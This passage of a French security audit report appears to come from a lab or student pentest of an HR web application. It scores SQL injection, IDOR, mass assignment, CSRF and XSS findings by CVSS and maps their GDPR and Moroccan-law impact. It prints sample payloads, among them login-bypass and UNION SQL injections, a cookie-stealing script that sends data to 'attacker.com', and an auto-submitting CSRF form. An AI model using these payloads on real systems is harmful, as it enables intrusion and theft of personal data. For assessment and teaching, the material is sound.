---
title: Identification des Vulnérabilités
sidebar_label: Identification Vulnérabilités
sidebar_position: 6
---

# 6. Identification des Vulnérabilités

## Vue d'ensemble

Ce chapitre présente les résultats de l'évaluation de sécurité menée sur l'infrastructure AtlasTech Solutions. Il documente les vulnérabilités identifiées, leur impact sur les actifs informationnels, leur évaluation selon le système CVSS v3.1, et leur classification dans une matrice des risques.

**Périmètre de l'évaluation:**
- Application web commerciale (PHP/MySQL)
- Module CRUD RH (gestion des employés)
- Infrastructure serveur (Ubuntu 24.04 LTS)

**Date de l'évaluation:** 13-14 février 2026  
**Méthodologie:** OWASP Testing Guide v4.2, NIST SP 800-115

---

## Section 1: Classification des actifs informationnels

### 1.1 Typologie des actifs

L'infrastructure AtlasTech Solutions contient trois catégories d'actifs informationnels:

**Données publiques:**
- Contenu marketing du site web commercial
- Informations générales de l'entreprise
- Pages institutionnelles

**Données internes:**
- Structure organisationnelle
- Départements et organigramme
- Postes et fonctions

**Données sensibles (Article 7, Loi 09-08):**
- Identité: Nom, prénom, CIN
- Coordonnées: Email, téléphone, adresse
- Données financières: Salaire, primes
- Données RH: Date d'embauche, évaluations

### 1.2 Cartographie des actifs et vulnérabilités

| Actif | Classification | Vulnérabilité associée | Criticité |
|-------|----------------|------------------------|-----------|
| Base de données employés | Sensible | SQL Injection | Critique |
| Données personnelles (CIN, salaires) | Sensible | IDOR | Critique |
| Comptes utilisateurs | Interne | Mass Assignment | Haute |
| Sessions utilisateurs | Interne | XSS, CSRF | Moyenne |
| Infrastructure système | Interne | - | - |

### 1.3 Surface d'attaque

**Endpoints publics:**
- `/login.php` - Authentification
- `/search.php` - Recherche d'employés
- `/index.php` - Page d'accueil

**Endpoints authentifiés:**
- `/view_employee.php` - Consultation de profil
- `/update_employee.php` - Modification de profil
- `/delete_employee.php` - Suppression de profil
- `/dashboard.php` - Tableau de bord

---

## Section 2: Synthèse des vulnérabilités identifiées

### 2.1 Tableau récapitulatif

| ID | Vulnérabilité | Endpoint | Paramètre | Auth requise | Méthode | CVSS | Sévérité |
|----|---------------|----------|-----------|--------------|---------|------|----------|
| V01 | SQL Injection | login.php | utilisateur, mot_de_passe | Non | POST | 9.8 | Critique |
| V02 | SQL Injection | search.php | q | Oui | GET | 8.1 | Haute |
| V03 | IDOR | view_employee.php | id | Oui | GET | 8.1 | Haute |
| V04 | Mass Assignment | update_employee.php | * | Oui | POST | 6.5 | Moyenne |
| V05 | CSRF | update_employee.php | * | Oui | POST | 6.5 | Moyenne |
| V06 | XSS Reflected | search.php | q | Non | GET | 6.1 | Moyenne |

**Légende:**
- Auth requise: Authentification nécessaire pour exploiter
- Méthode: Méthode HTTP utilisée
- \*: Tous les paramètres POST

### 2.2 Distribution par sévérité

```
Critique (9.0-10.0):  1 vulnérabilité  (17%)  ███████████████████
Haute (7.0-8.9):      2 vulnérabilités (33%)  █████████████████████████████████
Moyenne (4.0-6.9):    3 vulnérabilités (50%)  ██████████████████████████████████████████████████
Basse (0.1-3.9):      0 vulnérabilité  (0%)   
```

### 2.3 Distribution par catégorie OWASP

**OWASP Top 10 2021:**
- A03:2021 - Injection: 2 vulnérabilités (SQL Injection)
- A01:2021 - Broken Access Control: 2 vulnérabilités (IDOR, CSRF)
- A04:2021 - Insecure Design: 1 vulnérabilité (Mass Assignment)
- A03:2021 - Cross-Site Scripting: 1 vulnérabilité (XSS)

---

## Section 3: Description détaillée des vulnérabilités

### 3.1 SQL Injection

#### 3.1.1 V01: SQL Injection - login.php (Critique)

**Nature de la vulnérabilité:**

L'injection SQL est une technique d'exploitation qui permet à un attaquant d'insérer des requêtes SQL arbitraires dans une application. Cette vulnérabilité résulte de l'absence de validation et de paramétrage des entrées utilisateur avant leur utilisation dans des requêtes SQL.

**Mécanisme d'exploitation:**

Le code vulnérable construit dynamiquement une requête SQL en concaténant directement les entrées utilisateur:

```php
$utilisateur = $_POST['utilisateur'];
$mot_de_passe = $_POST['mot_de_passe'];

$query = "SELECT * FROM employes 
          WHERE utilisateur = '$utilisateur' 
          AND mot_de_passe = '$mot_de_passe'";
```

**Flux d'attaque:**

```
1. Attaquant soumet: utilisateur = "admin'--"
2. Requête générée: SELECT * FROM employes WHERE utilisateur = 'admin'--' AND ...
3. Le commentaire SQL (--) ignore la vérification du mot de passe
4. Résultat: Authentification bypassée
```

**Impact CIA:**
- **Confidentialité: HAUTE** - Accès complet à la base de données (24 employés, salaires, CIN)
- **Intégrité: HAUTE** - Modification/suppression de données possible
- **Disponibilité: HAUTE** - Possibilité de déni de service (DROP TABLE)

**Actif compromis:**
- Base de données `atlastech_db`
- Tables: `employes`, `departements`
- Données sensibles exposées: Nom, prénom, email, téléphone, adresse, salaire, CIN

**Détectabilité:**
- Exploitable automatiquement: **Oui** (SQLmap, Havij)
- Détectable via logs: **Partiellement** (erreurs SQL dans logs Apache)
- Signature IDS: **Oui** (patterns connus)

**Evidence:**
- Endpoint: `http://192.168.112.141/login.php`
- Paramètres vulnérables: `utilisateur`, `mot_de_passe`
- Méthode: POST
- Authentification requise: Non
- Date de découverte: 13/02/2026

---

#### 3.1.2 V02: SQL Injection - search.php (Haute)

**Nature de la vulnérabilité:**

Injection SQL de type UNION permettant l'extraction de données via l'opérateur SQL UNION. Cette vulnérabilité permet de combiner les résultats de la requête légitime avec une requête malveillante.

**Mécanisme d'exploitation:**

```php
$search = $_GET['q'];

$query = "SELECT e.*, d.nom as dept 
          FROM employes e 
          LEFT JOIN departements d ON e.departement_id = d.id 
          WHERE e.nom LIKE '%$search%' OR e.prenom LIKE '%$search%'";
```

**Flux d'attaque:**

```
1. Attaquant soumet: q = "test' UNION SELECT NULL,utilisateur,mot_de_passe,NULL,NULL--"
2. Requête générée combine les résultats légitimes avec l'extraction de credentials
3. Résultat: Affichage des utilisateurs et mots de passe en clair
```

**Impact CIA:**
- **Confidentialité: HAUTE** - Extraction de toutes les tables de la base
- **Intégrité: HAUTE** - Modification via stacked queries possible
- **Disponibilité: FAIBLE** - Impact limité sur la disponibilité

**Actif compromis:**
- Base de données complète
- Métadonnées système (information_schema)

**Détectabilité:**
- Exploitable automatiquement: **Oui**
- Détectable via logs: **Oui** (UNION dans access.log)
- Signature IDS: **Oui**

**Evidence:**
- Endpoint: `http://192.168.112.141/search.php`
- Paramètre vulnérable: `q`
- Méthode: GET
- Authentification requise: Oui
- Date de découverte: 13/02/2026

---

### 3.2 Cross-Site Scripting (XSS)

#### 3.2.1 V06: XSS Reflected - search.php (Moyenne)

**Nature de la vulnérabilité:**

Le Cross-Site Scripting (XSS) Reflected permet l'injection de code JavaScript malveillant qui s'exécute dans le navigateur de la victime. Le code injecté n'est pas stocké mais reflété immédiatement dans la réponse HTTP.

**Mécanisme d'exploitation:**

```php
// Affichage sans échappement HTML
<h2>Résultats pour: "<?php echo $_GET['q']; ?>"</h2>
```

**Flux d'attaque:**

```
1. Attaquant crée URL malveillante: 
   search.php?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

2. Victime clique sur le lien (social engineering)

3. JavaScript s'exécute dans le navigateur de la victime

4. Cookie de session envoyé vers serveur attaquant
```

**Impact CIA:**
- **Confidentialité: FAIBLE** - Vol de cookies (limité si HttpOnly activé)
- **Intégrité: FAIBLE** - Modification du DOM, injection de formulaires
- **Disponibilité: NÉGLIGEABLE** - Aucun impact direct

**Actif compromis:**
- Sessions utilisateurs
- Données affichées dans le navigateur

**Détectabilité:**
- Exploitable automatiquement: **Non** (nécessite social engineering)
- Détectable via logs: **Partiellement** (patterns JavaScript dans URL)
- Signature IDS: **Oui**

**Evidence:**
- Endpoint: `http://192.168.112.141/search.php`
- Paramètre vulnérable: `q`
- Méthode: GET
- Authentification requise: Non (mais exploitation efficace si victime authentifiée)
- Date de découverte: 13/02/2026

---

### 3.3 Cross-Site Request Forgery (CSRF)

#### 3.3.1 V05: CSRF - update_employee.php (Moyenne)

**Nature de la vulnérabilité:**

Le CSRF permet à un attaquant de forcer un utilisateur authentifié à exécuter des actions non désirées. L'absence de token anti-CSRF permet l'envoi de requêtes forgées depuis un site tiers.

**Mécanisme d'exploitation:**

L'application ne vérifie pas l'origine des requêtes POST. Les cookies de session sont automatiquement inclus par le navigateur même pour les requêtes cross-origin.

**Flux d'attaque:**

```
1. Victime authentifiée sur AtlasTech (cookie de session valide)

2. Victime visite site malveillant contenant:
   <form method="POST" action="http://atlastech.ma/update_employee.php">
     <input type="hidden" name="id" value="5">
     <input type="hidden" name="salaire" value="1">
   </form>
   <script>document.forms[0].submit();</script>

3. Navigateur envoie automatiquement le cookie de session

4. Action exécutée avec privilèges de la victime
```

**Impact CIA:**
- **Confidentialité: NÉGLIGEABLE** - Pas de fuite d'informations
- **Intégrité: HAUTE** - Modification non autorisée de données critiques
- **Disponibilité: NÉGLIGEABLE** - Aucun impact

**Actif compromis:**
- Données employés (modification via profil victime)
- Intégrité des processus métier

**Détectabilité:**
- Exploitable automatiquement: **Non** (nécessite social engineering)
- Détectable via logs: **Difficile** (requête légitime en apparence)
- Signature IDS: **Non** (trafic normal)

**Evidence:**
- Endpoint: `http://192.168.112.141/update_employee.php`
- Paramètres: Tous les champs POST
- Méthode: POST
- Authentification requise: Oui (victime)
- Protection CSRF: Absente
- Date de découverte: 13/02/2026

---

### 3.4 Mass Assignment

#### 3.4.1 V04: Mass Assignment - update_employee.php (Moyenne)

**Nature de la vulnérabilité:**

Le Mass Assignment permet à un attaquant de modifier des propriétés d'objet qui ne devraient pas être accessibles. Cette vulnérabilité résulte du traitement automatique de tous les paramètres POST sans validation.

**Mécanisme d'exploitation:**

```php
// Tous les champs POST sont acceptés sans filtrage
foreach ($_POST as $key => $value) {
    $data[$key] = mysqli_real_escape_string($conn, $value);
}

// Construction dynamique de la requête UPDATE
$query = "UPDATE employes SET " . implode(', ', $fields) . " WHERE id = $id";
```

**Flux d'attaque:**

```
1. Requête normale POST:
   nom=Hassan&prenom=Alami&email=hassan@mail.com

2. Requête modifiée (Mass Assignment):
   nom=Hassan&prenom=Alami&email=hassan@mail.com&is_admin=1&salaire=999999

3. Champs non prévus (is_admin, salaire) sont acceptés et insérés en base

4. Résultat: Escalade de privilèges ou manipulation financière
```

**Impact CIA:**
- **Confidentialité: NÉGLIGEABLE** - Pas de fuite directe
- **Intégrité: CRITIQUE** - Modification de champs sensibles (is_admin, role, salaire)
- **Disponibilité: NÉGLIGEABLE** - Aucun impact

**Champs sensibles exposés:**
- `is_admin`: Privilèges administrateur
- `role`: Rôle utilisateur (admin, user, manager)
- `salaire`: Montant du salaire
- `departement_id`: Affectation département
- `created_at`, `updated_at`: Métadonnées système

**Actif compromis:**
- Système de contrôle d'accès (via is_admin)
- Données financières (via salaire)

**Détectabilité:**
- Exploitable automatiquement: **Oui** (via proxy HTTP)
- Détectable via logs: **Non** (paramètres POST normaux)
- Signature IDS: **Non**

**Evidence:**
- Endpoint: `http://192.168.112.141/update_employee.php`
- Paramètres vulnérables: Tous (pas de whitelist)
- Méthode: POST
- Authentification requise: Oui
- Date de découverte: 13/02/2026

---

### 3.5 Insecure Direct Object Reference (IDOR)

#### 3.5.1 V03: IDOR - view_employee.php (Haute)

**Nature de la vulnérabilité:**

L'IDOR permet à un utilisateur authentifié d'accéder aux données d'autres utilisateurs en modifiant simplement un identifiant dans l'URL. L'absence de vérification d'autorisation permet l'énumération et l'accès non autorisé.

**Mécanisme d'exploitation:**

```php
// Aucune vérification que l'utilisateur a le droit de voir cet employé
$id = $_GET['id'];
$query = "SELECT * FROM employes WHERE id = $id";
$result = mysqli_query($conn, $query);
$employee = mysqli_fetch_assoc($result);

// Affichage direct sans contrôle d'accès
echo $employee['nom'] . " - " . $employee['salaire'];
```

**Flux d'attaque:**

```
1. Utilisateur authentifié accède à son profil:
   view_employee.php?id=10

2. Modification manuelle de l'ID:
   view_employee.php?id=1
   view_employee.php?id=2
   ...
   view_employee.php?id=24

3. Accès aux données de tous les employés (énumération)
```

**Impact CIA:**
- **Confidentialité: CRITIQUE** - Accès à 24 dossiers employés complets
- **Intégrité: HAUTE** - Modification via update_employee.php?id=X
- **Disponibilité: FAIBLE** - Suppression possible via delete_employee.php?id=X

**Données sensibles exposées (par employé):**
- Identité: Nom, prénom, CIN (numéro d'identité nationale)
- Contact: Email, téléphone, adresse domicile
- Emploi: Poste, département, date d'embauche
- Financier: Salaire mensuel, primes

**Actif compromis:**
- 24 dossiers personnels complets
- Base de données RH complète

**Détectabilité:**
- Exploitable automatiquement: **Oui** (script d'énumération)
- Détectable via logs: **Oui** (accès séquentiels suspects)
- Signature IDS: **Possible** (pattern d'énumération)

**Evidence:**
- Endpoint: `http://192.168.112.141/view_employee.php`
- Paramètre vulnérable: `id`
- Méthode: GET
- Authentification requise: Oui
- Contrôle d'accès: Absent
- Nombre d'enregistrements exposés: 24/24 (100%)
- Date de découverte: 13/02/2026

---

## Section 4: Évaluation CVSS

### 4.1 Système CVSS v3.1

**Common Vulnerability Scoring System (CVSS)** est un système standardisé de notation développé par le FIRST (Forum of Incident Response and Security Teams) pour évaluer la sévérité des vulnérabilités.

**Métriques de base (Base Metrics):**

| Métrique | Description | Valeurs possibles |
|----------|-------------|-------------------|
| Attack Vector (AV) | Vecteur d'attaque | Network (N), Adjacent (A), Local (L), Physical (P) |
| Attack Complexity (AC) | Complexité | Low (L), High (H) |
| Privileges Required (PR) | Privilèges | None (N), Low (L), High (H) |
| User Interaction (UI) | Interaction | None (N), Required (R) |
| Scope (S) | Portée | Unchanged (U), Changed (C) |
| Confidentiality (C) | Impact confidentialité | None (N), Low (L), High (H) |
| Integrity (I) | Impact intégrité | None (N), Low (L), High (H) |
| Availability (A) | Impact disponibilité | None (N), Low (L), High (H) |

**Échelle de sévérité:**
- 0.0: Aucune
- 0.1-3.9: Basse
- 4.0-6.9: Moyenne
- 7.0-8.9: Haute
- 9.0-10.0: Critique

### 4.2 Évaluation détaillée

#### 4.2.1 V01: SQL Injection (login.php)

**Vecteur CVSS v3.1:**
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

**Justification des métriques:**

| Métrique | Valeur | Justification |
|----------|--------|---------------|
| AV | Network (N) | Exploitable via Internet, aucune restriction réseau |
| AC | Low (L) | Exploitation triviale (payload: `' OR '1'='1`), pas de conditions spéciales |
| PR | None (N) | Page de login publique, aucune authentification préalable |
| UI | None (N) | Exploitation directe, sans interaction utilisateur |
| S | Unchanged (U) | Impact limité au serveur et base de données |
| C | High (H) | Accès complet à toute la base de données (24 employés, salaires, CIN) |
| I | High (H) | Modification/suppression complète possible (UPDATE, DELETE, DROP) |
| A | High (H) | Déni de service possible (DROP DATABASE, corruption) |

**Score final: 9.8 (CRITIQUE)**

**Impact organisationnel:**
- Compromission totale de la base de données RH
- Violation massive de la confidentialité (24 employés)
- Risque légal majeur (RGPD Article 32)

---

#### 4.2.2 V02: SQL Injection (search.php)

**Vecteur CVSS v3.1:**
```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
```

**Justification:**

| Métrique | Valeur | Justification |
|----------|--------|---------------|
| AV | Network (N) | Accessible via réseau |
| AC | Low (L) | UNION SQL Injection standard |
| PR | Low (L) | Authentification utilisateur requise |
| UI | None (N) | Pas d'interaction |
| S | Unchanged (U) | Impact base de données |
| C | High (H) | Extraction complète via UNION SELECT |
| I | High (H) | Modification via stacked queries |
| A | None (N) | Pas d'impact disponibilité direct |

**Score final: 8.1 (HAUTE)**

---

#### 4.2.3 V03: IDOR (view_employee.php)

**Vecteur CVSS v3.1:**
```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
```

**Justification:**

| Métrique | Valeur | Justification |
|----------|--------|---------------|
| AV | Network (N) | Via URL web |
| AC | Low (L) | Simple modification d'ID dans URL |
| PR | Low (L) | Compte utilisateur requis |
| UI | None (N) | Modification directe d'URL |
| S | Unchanged (U) | Impact données employés |
| C | High (H) | Accès à 24 dossiers complets (salaires, CIN) |
| I | High (H) | Modification possible via update_employee.php |
| A | None (N) | Pas d'impact disponibilité |

**Score final: 8.1 (HAUTE)**

**Impact organisationnel:**
- Violation de la vie privée de 24 employés
- Exposition de données personnelles sensibles (CIN)
- Risque de chantage/extorsion (salaires)

---

#### 4.2.4 V04: Mass Assignment

**Vecteur CVSS v3.1:**
```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
```

**Justification:**

| Métrique | Valeur | Justification |
|----------|--------|---------------|
| AV | Network (N) | Via requête HTTP |
| AC | Low (L) | Simple ajout de paramètre POST |
| PR | Low (L) | Compte utilisateur requis |
| UI | None (N) | Requête directe |
| S | Unchanged (U) | Impact application |
| C | None (N) | Pas de fuite directe |
| I | High (H) | Escalade privilèges (is_admin=1), modification salaires |
| A | None (N) | Pas d'impact |

**Score final: 6.5 (MOYENNE)**

**Note:** Malgré un score moyen, l'impact est **critique** (escalade de privilèges).

---

#### 4.2.5 V05: CSRF

**Vecteur CVSS v3.1:**
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N
```

**Justification:**

| Métrique | Valeur | Justification |
|----------|--------|---------------|
| AV | Network (N) | Via page web malveillante |
| AC | Low (L) | Formulaire caché simple |
| PR | None (N) | Attaquant sans compte |
| UI | Required (R) | Victime doit visiter site malveillant |
| S | Unchanged (U) | Impact application |
| C | None (N) | Pas de fuite |
| I | High (H) | Modification données sensibles (salaires) |
| A | None (N) | Pas d'impact |

**Score final: 6.5 (MOYENNE)**

---

#### 4.2.6 V06: XSS Reflected

**Vecteur CVSS v3.1:**
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
```

**Justification:**

| Métrique | Valeur | Justification |
|----------|--------|---------------|
| AV | Network (N) | Via lien malveillant |
| AC | Low (L) | Payload simple |
| PR | None (N) | Pas d'authentification |
| UI | Required (R) | Clic sur lien nécessaire |
| S | Changed (C) | Code s'exécute dans navigateur victime |
| C | Low (L) | Vol cookies (limité si HttpOnly) |
| I | Low (L) | Modification DOM |
| A | None (N) | Pas d'impact |

**Score final: 6.1 (MOYENNE)**

---

### 4.3 Tableau récapitulatif CVSS

| ID | Vulnérabilité | Vecteur CVSS | Score | Sévérité |
|----|---------------|--------------|-------|----------|
| V01 | SQL Injection (login.php) | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | **9.8** | **CRITIQUE** |
| V02 | SQL Injection (search.php) | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N | **8.1** | HAUTE |
| V03 | IDOR | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N | **8.1** | HAUTE |
| V04 | Mass Assignment | AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N | **6.5** | MOYENNE* |
| V05 | CSRF | AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N | **6.5** | MOYENNE |
| V06 | XSS Reflected | AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N | **6.1** | MOYENNE |

*Malgré un score moyen, Mass Assignment permet une escalade de privilèges et doit être traité comme priorité haute.

---

## Section 5: Analyse des risques

### 5.1 Méthodologie

**Calcul du risque:**
```
Risque = Probabilité d'exploitation × Impact organisationnel
```

**Échelle de probabilité (1-5):**
- 5 - Très élevée: Exploitation triviale, outils automatisés disponibles
- 4 - Élevée: Exploitation facile avec compétences de base
- 3 - Moyenne: Compétences intermédiaires requises
- 2 - Faible: Compétences avancées requises
- 1 - Très faible: Exploitation très difficile

**Échelle d'impact (1-5):**
- 5 - Critique: Arrêt d'activité, compromission majeure
- 4 - Élevé: Perte financière importante, atteinte réputation
- 3 - Moyen: Perturbation temporaire
- 2 - Faible: Gêne limitée
- 1 - Négligeable: Impact minimal

**Matrice de risque:**

| Probabilité \ Impact | 1 | 2 | 3 | 4 | 5 |
|---------------------|---|---|---|---|---|
| **5** | 5 | 10 | 15 | 20 | **25** |
| **4** | 4 | 8 | 12 | **16** | **20** |
| **3** | 3 | 6 | 9 | **12** | 15 |
| **2** | 2 | 4 | 6 | 8 | 10 |
| **1** | 1 | 2 | 3 | 4 | 5 |

**Niveaux de risque:**
- 20-25: CRITIQUE (rouge foncé)
- 15-19: ÉLEVÉ (rouge)
- 10-14: MOYEN (orange)
- 5-9: FAIBLE (jaune)
- 1-4: NÉGLIGEABLE (vert)

### 5.2 Évaluation par vulnérabilité

#### 5.2.1 V01: SQL Injection (login.php)

**Probabilité: 5/5 (Très élevée)**

Facteurs:
- Endpoint public (pas d'authentification requise)
- Exploitation en < 60 secondes
- Outils automatisés disponibles (SQLmap)
- Pas de protection (WAF absent, validation absente)
- Payload trivial: `' OR '1'='1`

**Impact: 5/5 (Critique)**

Facteurs techniques:
- Compromission complète base de données
- 24 dossiers employés exposés
- Mots de passe en clair

Facteurs organisationnels:
- Violation RGPD Article 32 (sécurité du traitement)
- Obligation notification CNDP (Commission Nationale de contrôle de la protection des Données à caractère Personnel)
- Risque poursuites individuelles (24 employés)
- Atteinte réputation majeure

**Risque: 5 × 5 = 25 (CRITIQUE)**

---

#### 5.2.2 V03: IDOR

**Probabilité: 4/5 (Élevée)**

Facteurs:
- Authentification requise (barrière minimale)
- Exploitation triviale (modification d'URL)
- Énumération automatisable
- Difficile à détecter sans logging

**Impact: 5/5 (Critique)**

Facteurs:
- 24 dossiers personnels accessibles
- Données sensibles: CIN (usurpation d'identité possible)
- Salaires (risque chantage, tensions internes)
- Violation loi 09-08 (protection données personnelles)

**Risque: 4 × 5 = 20 (CRITIQUE)**

---

#### 5.2.3 V04: Mass Assignment

**Probabilité: 4/5 (Élevée)**

Facteurs:
- Compte utilisateur requis
- Exploitation simple (Burp Suite, cURL)
- Testable en < 5 minutes

**Impact: 5/5 (Critique)**

Facteurs:
- Escalade privilèges (is_admin=1)
- Modification salaires (fraude financière)
- Corruption processus paie
- Accès fonctions admin

**Risque: 4 × 5 = 20 (CRITIQUE)**

---

#### 5.2.4 V02: SQL Injection (search.php)

**Probabilité: 4/5 (Élevée)**

Facteurs:
- Authentification requise
- UNION SQL standard
- Outils automatisés efficaces

**Impact: 4/5 (Élevé)**

Facteurs:
- Extraction données (comme V01)
- Mais nécessite compte valide
- Même risque légal

**Risque: 4 × 4 = 16 (ÉLEVÉ)**

---

#### 5.2.5 V05: CSRF

**Probabilité: 3/5 (Moyenne)**

Facteurs:
- Social engineering requis
- Victime doit être connectée
- Victime doit visiter site malveillant
- Détectable par utilisateurs vigilants

**Impact: 4/5 (Élevé)**

Facteurs:
- Modification salaires possible
- Actions admin si admin victime
- Pas de fuite données (seulement modification)

**Risque: 3 × 4 = 12 (MOYEN)**

---

#### 5.2.6 V06: XSS Reflected

**Probabilité: 3/5 (Moyenne)**

Facteurs:
- Social engineering requis
- XSS non persistant
- HttpOnly réduit impact

**Impact: 3/5 (Moyen)**

Facteurs:
- Vol session possible
- Phishing possible
- Pas d'accès serveur

**Risque: 3 × 3 = 9 (FAIBLE)**

---

### 5.3 Matrice de risques AtlasTech

```
MATRICE DES RISQUES - AtlasTech Solutions

        Impact organisationnel →
        1       2       3       4       5
      ┌───────┬───────┬───────┬───────┬───────┐
    5 │       │       │       │       │ V01   │ Probabilité
      │       │       │       │       │ ▓▓▓▓▓ │ Très élevée
      ├───────┼───────┼───────┼───────┼───────┤
    4 │       │       │       │ V02   │ V03   │ Élevée
      │       │       │       │ ░░░░  │ V04   │
      │       │       │       │       │ ▓▓▓▓▓ │
      ├───────┼───────┼───────┼───────┼───────┤
    3 │       │       │ V06   │ V05   │       │ Moyenne
      │       │       │ ░░░   │ ▒▒▒▒  │       │
      ├───────┼───────┼───────┼───────┼───────┤
    2 │       │       │       │       │       │ Faible
      ├───────┼───────┼───────┼───────┼───────┤
    1 │       │       │       │       │       │ Très faible
      └───────┴───────┴───────┴───────┴───────┘
        Négl.  Faible  Moyen   Élevé   Critique

Légende:
▓▓▓▓▓ = Risque CRITIQUE (20-25)
░░░░  = Risque ÉLEVÉ (15-19)
▒▒▒▒  = Risque MOYEN (10-14)
░░░   = Risque FAIBLE (5-9)
```

### 5.4 Synthèse des risques

**Distribution des risques:**
- Risque CRITIQUE: 3 vulnérabilités (50%)
- Risque ÉLEVÉ: 1 vulnérabilité (17%)
- Risque MOYEN: 1 vulnérabilité (17%)
- Risque FAIBLE: 1 vulnérabilité (17%)

**Priorisation:**

**Priorité 1 (Immédiate - 24-48h):**
- V01: SQL Injection (login.php) - Risque 25
- V03: IDOR - Risque 20
- V04: Mass Assignment - Risque 20

**Priorité 2 (Urgente - 1 semaine):**
- V02: SQL Injection (search.php) - Risque 16

**Priorité 3 (Haute - 2 semaines):**
- V05: CSRF - Risque 12

**Priorité 4 (Moyenne - 1 mois):**
- V06: XSS Reflected - Risque 9

---

## Section 6: Impact métier et conformité réglementaire

### 6.1 Cartographie processus métier impactés

| Vulnérabilité | Actif compromis | Processus métier | Impact organisationnel |
|---------------|-----------------|------------------|------------------------|
| V01: SQL Injection | Base de données employés | - Paie<br />- Gestion RH<br />- Recrutement | - Arrêt processus paie<br />- Corruption données salariales<br />- Perte confiance employés |
| V03: IDOR | Dossiers personnels (24) | - Confidentialité RH<br />- Relations sociales<br />- Conformité RGPD | - Violation vie privée massive<br />- Tensions internes (salaires)<br />- Risque chantage/extorsion |
| V04: Mass Assignment | Contrôle d'accès<br />Données financières | - Sécurité informatique<br />- Gestion financière<br />- Audit interne | - Compromission privilèges<br />- Fraude salariale<br />- Perte traçabilité |
| V02: SQL Injection | Base de données complète | - Gestion de l'information<br />- Continuité d'activité | - Corruption données<br />- Risque perte données |
| V05: CSRF | Intégrité données | - Gestion RH<br />- Paie | - Modifications non autorisées<br />- Erreurs de paie |
| V06: XSS | Sessions utilisateurs | - Sécurité accès | - Vol sessions<br />- Usurpation identité |

### 6.2 Impact financier estimé

**Coûts directs potentiels:**

**Amendes réglementaires (scénario de violation):**
- RGPD: Jusqu'à 4% du CA annuel mondial ou 20M€ (le montant le plus élevé)
- Loi 09-08 (Maroc): Jusqu'à 20 millions de dirhams

**Coûts de remédiation:**
- Audit post-incident: 15 000 - 30 000 MAD
- Correction code: 40 000 - 80 000 MAD (développement + tests)
- Notification aux personnes concernées: 5 000 - 10 000 MAD
- Conseil juridique: 20 000 - 50 000 MAD

**Coûts indirects:**
- Atteinte réputation: Impact long terme sur recrutement
- Perte productivité: Temps de remise en état
- Actions en justice individuelles: Risque 24 employés
- Perte de confiance: Turnover possible

### 6.3 Conformité réglementaire

#### 6.3.1 RGPD (Règlement Général sur la Protection des Données)

**Articles concernés:**

**Article 5 - Principes:**
Violation du principe d'intégrité et de confidentialité des données.

**Article 32 - Sécurité du traitement:**
> "Le responsable du traitement [...] met en œuvre les mesures techniques et organisationnelles appropriées afin de garantir un niveau de sécurité adapté au risque"

**Non-conformité identifiée:**
- Absence de chiffrement (mots de passe en clair)
- Absence de contrôle d'accès approprié (IDOR)
- Absence de mesures contre injection SQL
- Pas de pseudonymisation/chiffrement des données sensibles

**Article 33 - Notification violation:**
En cas d'exploitation:
- Notification à l'autorité de contrôle: 72 heures
- Notification aux personnes concernées: Sans délai si risque élevé

**Risques:**
- Amende administrative: Jusqu'à 20M€ ou 4% CA
- Mise en demeure publique
- Suspension temporaire des traitements

#### 6.3.2 Loi 09-08 (Loi marocaine sur la protection des données personnelles)

**Articles concernés:**

**Article 7 - Données sensibles:**
Les salaires et numéros CIN sont des données sensibles nécessitant une protection renforcée.

**Article 23 - Sécurité:**
> "Le responsable du traitement doit prendre les précautions utiles afin de préserver la sécurité des données à caractère personnel"

**Non-conformité:**
- Mesures de sécurité insuffisantes
- Accès non contrôlé aux données sensibles
- Absence de journalisation des accès

**Autorité compétente:**
Commission Nationale de contrôle de la protection des Données à caractère Personnel (CNDP)

**Sanctions possibles:**
- Sanctions pénales: Emprisonnement et/ou amendes
- Sanctions administratives: Jusqu'à 20 millions MAD
- Obligation de notification en cas de violation

#### 6.3.3 Obligations en cas d'exploitation

**Si une vulnérabilité est exploitée:**

1. **Notification CNDP:** 72 heures maximum
2. **Documentation:**
   - Nature de la violation
   - Catégories de données concernées
   - Nombre de personnes affectées (24 employés)
   - Mesures prises/envisagées

3. **Notification employés:**
   - Si risque élevé pour leurs droits et libertés
   - Description claire et simple de la violation
   - Mesures de protection recommandées

4. **Mesures correctives:**
   - Correction immédiate des vulnérabilités
   - Renforcement général de la sécurité
   - Audit de sécurité complet

### 6.4 Facteurs de détectabilité

| Vulnérabilité | Exploitable automatiquement | Détectable via logs | Signature IDS/IPS |
|---------------|----------------------------|---------------------|-------------------|
| V01: SQL Injection (login) | **Oui** (SQLmap) | Partiel (erreurs SQL) | **Oui** (patterns) |
| V02: SQL Injection (search) | **Oui** (SQLmap) | **Oui** (UNION dans logs) | **Oui** |
| V03: IDOR | **Oui** (énumération) | **Oui** (accès séquentiels) | Partiel |
| V04: Mass Assignment | **Oui** (proxy HTTP) | **Non** (POST normal) | **Non** |
| V05: CSRF | **Non** (social eng.) | Difficile | **Non** |
| V06: XSS | **Non** (social eng.) | Partiel (JS dans URL) | **Oui** |

**Analyse:**
- 4/6 vulnérabilités exploitables automatiquement
- 3/6 détectables efficacement via logs
- Absence actuelle de système de détection (IDS/WAF)

**Recommandations de détection:**
- Implémenter WAF (Web Application Firewall)
- Activer logging détaillé (accès, modifications)
- Mettre en place alertes sur patterns suspects
- Monitoring temps réel (Wazuh, ELK Stack)

---

## Section 7: Synthèse et recommandations stratégiques

### 7.1 Synthèse exécutive

**Situation actuelle:**

L'évaluation de sécurité révèle une **situation critique** avec 6 vulnérabilités identifiées, dont 3 classées à risque critique (score 20-25).

**Exposition:**
- **24 dossiers employés** entièrement accessibles
